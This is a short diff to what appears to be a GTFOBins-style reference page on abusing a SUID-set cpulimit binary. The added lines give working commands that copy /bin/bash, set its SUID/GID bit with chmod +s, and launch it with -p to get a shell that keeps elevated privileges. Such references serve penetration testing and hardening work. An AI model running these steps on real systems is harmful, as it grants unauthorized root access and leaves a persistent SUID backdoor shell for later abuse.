@@ -23,3 +23,15 @@ sudo install -m =xs $(which cpulimit) .
 ```
 
 If cpulimit is exploitable, you could install or exploit through existing binary.
+
+To further extend this, you could also use this to copy change permission & then execute.
+
+
+- Copy bash to your home
+  - `cpulimit -l 100 -f cp /bin/bash .`
+
+- Set UID/GID by chmod +s
+  - `cpulimit -l 100 -f chmod +s ./bash`
+
+- execute with -p (drop into shell)
+  - `./bash -p`
